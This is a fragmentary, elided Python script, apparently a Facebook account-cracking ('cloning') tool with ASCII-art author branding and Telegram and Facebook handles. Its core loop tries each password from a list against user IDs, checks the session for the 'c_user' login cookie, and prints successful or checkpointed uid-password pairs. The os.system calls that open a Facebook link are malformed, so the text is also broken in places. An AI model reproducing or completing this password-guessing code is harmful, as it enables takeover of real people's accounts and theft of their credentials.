...
os.system('https://www.facebook.com/share/higf5C7nt5nPAitA/?mibextid=qi2Omg')
...
try:
    ...
    os.system("xdg-openhttps://www.facebook.com/share/higf5C7nt5nPAitA/?mibextid=qi2Omg")
...
╭╮╮╱▔▔▔▔╲╭╭╮
 ...
 ╭╱╱ ▕╋╋╋╋▏╲╲╮
 ╰╯╯┈╲▂▂╱┈╰╰
_____𓆩🔥 M O A D 🔥𓆪 _____

\r\033[1;35m===========================
 \r\033[1;33m 𝐴𝐔𝑇𝐻𝑂𝑅 𖠠:   M O A D 🔥
\r\033[1;34m  𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊: M O A D
  \r\033[1;34m GITHUB 𖡰: M O A D🔥
\r\033[1;36m LIFESTATUS 𖠚  :  𝑺𝑰𝑵𝑮𝑳𝑬 𖡡 😥  
\r\033[1;32mTELEGRAM ❥:  @MIZDAEI𖠥  \r\033[1;35m===========================       
_____𓆩M O A D🔥𓆪 _____
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[7:22]
				print('\033[1;32m [M O A D ✅-𝑂𝐾] '+uidx+'-'+uid+'-'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[24:39]
				print('\033[1;31m [M O A D ❌-𝐂𝐏] '+uidx+'-'+uid+'-'+pasw+'\033[0;97m')
